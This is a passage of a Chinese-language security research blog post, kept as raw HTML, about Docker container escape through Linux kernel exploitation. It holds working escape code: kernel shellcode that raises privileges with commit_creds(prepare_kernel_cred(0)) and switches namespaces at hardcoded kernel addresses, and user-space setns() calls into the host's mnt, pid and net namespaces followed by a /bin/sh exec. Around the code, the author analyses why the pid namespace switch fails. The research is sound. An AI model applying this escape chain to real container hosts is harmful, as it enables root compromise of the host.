52);">(</span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF810EEF60</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> fd1 </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">sys_open_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">AT_FDCWD</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token string" style="color: rgb(227, 17, 108);">"/proc/1/ns/mnt"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> O_RDONLY</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">sys_setns_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">fd1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> fd2 </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">sys_open_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">AT_FDCWD</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token string" style="color: rgb(227, 17, 108);">"/proc/1/ns/pid"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> O_RDONLY</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">sys_setns_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">fd2</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">shellcode</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">commit_creds</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token function" style="color: rgb(215, 58, 73);">prepare_kernel_cred</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">sw_ns_set_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里有两个小插曲：</p>
<ol>
<li>
<p>在无法关闭SMEP的情况下，这段shellcode能否直接在内核中执行？</p>
<p>如果在内核中以shellcode形式执行该代码，会在执行open()时返回错误码-14（EFAULT）。通过调试定位到错误产生的代码位置在 <code>do_sys_open() -&gt; do_sys_openat2() -&gt; getname() -&gt; getname_flags() -&gt; strncpy_from_user()</code> 函数中：</p>
<p><img decoding="async" loading="lazy" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/595dddf8-fa83-478e-9cc6-09acde951696-f51268049a0661521da1f95e14a575b0.png" width="1224" height="312" class="img_ev3q"></p>
<p>所以，在内核中使用shellcode做以上利用逻辑时，需将sys_open()的第二个字符串参数设置为用户态地址。</p>
</li>
<li>
<p>pid namespace是否切换成功？</p>
<p>没有切换成功。虽然通过 <code>ps -ef</code> 列出host的所有进程，但这只是因为mnt namespace切换成功后可以读取到host 的 <code>/proc/</code> 目录中的内容而已。详细分析见后续章节。</p>
</li>
</ol>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="43-改capns-v20">4.3 改cap+ns v2.0<a href="https://tiangonglab.github.io/blog/tiangongarticle030#43-%E6%94%B9capns-v20" class="hash-link" aria-label="4.3 改cap+ns v2.0的直接链接" title="4.3 改cap+ns v2.0的直接链接">​</a></h3>
<p>由于高版本Linux内核镜像中不再存在操作CR4的gadget，也就无法直接通过ROP关闭SMEP，因此上述ret2usr执行逃逸代码的方案失效。</p>
<p>新的利用思路跟上一小节1.0版本基本相同，只是把代码逻辑分成内核和用户态两部分：</p>
<ul>
<li>
<p>内核态ROP执行：commit_creds() + switch_task_namespaces()</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">shellcode</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">commit_creds</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token function" style="color: rgb(215, 58, 73);">prepare_kernel_cred</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">find_task_by_vpid_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF810E6500</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token class-name">size_t</span><span class="token plain"> g </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">find_task_by_vpid_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token number" style="color: rgb(54, 172, 170);">1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token class-name">size_t</span><span class="token plain"> init_nsproxy </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF82E8B000</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">switch_task_ns_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF810EECB0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">switch_task_ns_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">g</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> init_nsproxy</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>返回用户态后执行：setns()</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">main</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... after return from kernel... */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> ret </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> fd_mnt</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> fd_pid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> fd_net</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">fd_mnt </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">open</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"/proc/1/ns/mnt"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> O_RDONLY</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">printf</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"fd_mnt: %d , errno: %d \n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain">fd_mnt</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> errno</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    ret </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">setns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">fd_mnt</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">printf</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"mnt ret: %d , errno: %d \n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> ret</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> errno</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">errno </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">fd_pid </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">open</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"/proc/1/ns/pid"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> O_RDONLY</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">printf</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"fd_pid: %d , errno: %d \n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain">fd_pid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> errno</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    ret </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">setns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">fd_pid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">printf</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"pid ret: %d , errno: %d \n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> ret</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> errno</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">errno </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">fd_net </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">open</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"/proc/1/ns/net"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> O_RDONLY</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">printf</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"fd_net: %d , errno: %d \n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain">fd_net</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> errno</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    ret </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">setns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">fd_net</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">printf</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"net ret: %d , errno: %d \n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> ret</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> errno</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">args</span><span class="token punctuation" style="color: rgb(57, 58, 52);">[</span><span class="token punctuation" style="color: rgb(57, 58, 52);">]</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token string" style="color: rgb(227, 17, 108);">"/bin/sh"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token constant" style="color: rgb(54, 172, 170);">NULL</span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">execve</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"/bin/sh"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> args</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token constant" style="color: rgb(54, 172, 170);">NULL</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
</ul>
<p>执行效果如下：</p>
<p><img decoding="async" loading="lazy" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/4085c621-9cf5-4429-b841-345df81067c7-e169d6a6acec6dfc80caa86fd89753db.png" width="2097" height="663" class="img_ev3q"></p>
<p>看上去逃逸成功了？但 <code>setns(fd_pid, 0);</code> 这句执行出错并返回错误码22，对应的意思是"Invalid argument"。</p>
<p>假如此时我们尝试kill一个进程，会发现pid namespace依然还在Docker中！无法终止任何host进程。</p>
<p><img decoding="async" loading="lazy" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/d7760a3b-11f2-4e6a-9878-143c5b877bd6-6e3bc62fe7b67fe833272b8656d79f3d.png" width="1921" height="151" class="img_ev3q"></p>
<p>然后，对比一下当前Docker进程和host中pid为1进程的ns目录，发现mnt和net的值相同，表明二者都切换成功了。但pid的值不相同，说明pid namespace切换失败。这个结果跟上图中 setns() pid 时返回失败能对应上。</p>
<p><img decoding="async" loading="lazy" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/85151375-1a6c-4705-b3cf-a9290d977766-59eb2422963ce7fe989871d32c0c8e05.png" width="2201" height="548" class="img_ev3q"></p>
<p>但是为什么公开的exp中都未提及该问题？因为他们没有检查setns()的返回值，所以没发现这个问题。</p>
<p><img decoding="async" loading="lazy" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/9fb718d5-1a3a-4307-95d3-2001c892ea14-c33462167de52073ee56c7ab8911649a.png" width="556" height="206" class="img_ev3q"></p>
<p>那么使用 setns() 切换 pid namespace 时报"Invalid argument"这个错误，其背后的原因是什么呢？如何避免该错误的发生从而完成 pid namespace 的切换呢？</p>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="44-被忽略的-pid-namespace">4.4 被忽略的 pid namespace<a href="https://tiangonglab.github.io/blog/tiangongarticle030#44-%E8%A2%AB%E5%BF%BD%E7%95%A5%E7%9A%84-pid-namespace" class="hash-link" aria-label="4.4 被忽略的 pid namespace的直接链接" title="4.4 被忽略的 pid namespace的直接链接">​</a></h3>
<p><strong>跟踪 sys_setns 过程</strong></p>
<p>setns() 系统调用在内核中的<a href="https://elixir.bootlin.com/linux/v5.15/source/kernel/nsproxy.c#L527" target="_blank" rel="noopener noreferrer">入口函数</a>如下：</p>
